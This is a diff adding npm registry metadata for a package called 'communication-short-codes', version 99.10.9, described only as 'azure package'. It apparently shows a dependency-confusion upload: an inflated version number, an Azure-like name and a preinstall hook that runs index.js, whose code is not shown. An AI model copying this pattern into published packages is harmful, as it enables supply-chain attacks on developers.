@@ -1,0 +1,62 @@
+{
+    "_id": "communication-short-codes",
+    "name": "communication-short-codes",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "communication-short-codes",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "communication-short-codes@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-DtHszVHbHDFnYxWjr7T1Qr9G00RRxst6i7XdGXFhflvKTT3h3J1cK868g/+ydM96ZA1PaKzSl13mA+ujP6dZtw==",
+                "shasum": "68f7262b43a6766f614100c58608566590418a77",
+                "tarball": "https://registry.npmjs.org/communication-short-codes/-/communication-short-codes-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5074,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNblfACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqXaRAAh8qJuRfyFHD+6HiV4c5n8/f0uag0VFmn31NTwGMCsMDVeMSE\r\nyABL0KrCA45sEi8Pzkubwr7WWNslgNHjm/JZBVWPQNNEuCXcQjeKG2S5XnIp\r\nr9RWc9LUd9qTFMrQA7/MTetIhl1uBmk8air+X+3TjvCUwnjqHVirbzod7Zni\r\nVsMeJ1EJvYiwXiYmKOXA5sMd6KDUIJVmnlTUkrtM27aXgGMbA+tbsSJskpfQ\r\nI8uAX/V/iAEdHaCoAUEmQGX54jkgSJhmTy0Fy7BpYK63R+zehSqYvFY7ey5T\r\nxXsxVR//kX2XpFjs5xlFG567mEf7MMaYIfRC3OB0QTQy+ng6/BY4vnC2ZnSM\r\nefNC4YLoftpG7DV+NDmePdyTbau1MHkaL460kd7ly+2GQDFoFibKR6FEWvFe\r\nffL9SR2OgyJFQQk6+ZIWIDg+EelfirMXIYwMyhnHZrY04iifk1xi0c9TPACf\r\ntjqIjbiHrszRJpCn4uQWxtkrD2hoyYi6BA23auEmKK7/wdGSe6DrO8iuROoT\r\nXZkpHRImr9FHjUn7SVjopRXOpIW6JGHttVNBnH3yJ7yNUMtGshWANpanFbDI\r\nQBKi6bcInCyhnU+a6/sXnuuj1FYdDhDsUhUlzv2TlWfcLTguBIZk426QbVwp\r\nQQPlFk5OJBGczGsT2pQE1B5b1akTz8hgBnQ=\r\n=j4RI\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "13oddcck",
+                "email": "13oddcck@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "13oddcck",
+                    "email": "13oddcck@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/communication-short-codes_99.10.9_1647688031474_0.2961340993474326"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T11:07:11.474Z",
+        "99.10.9": "2022-03-19T11:07:11.647Z",
+        "modified": "2022-03-19T11:07:11.749Z"
+    },
+    "maintainers": [
+        {
+            "name": "13oddcck",
+            "email": "13oddcck@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
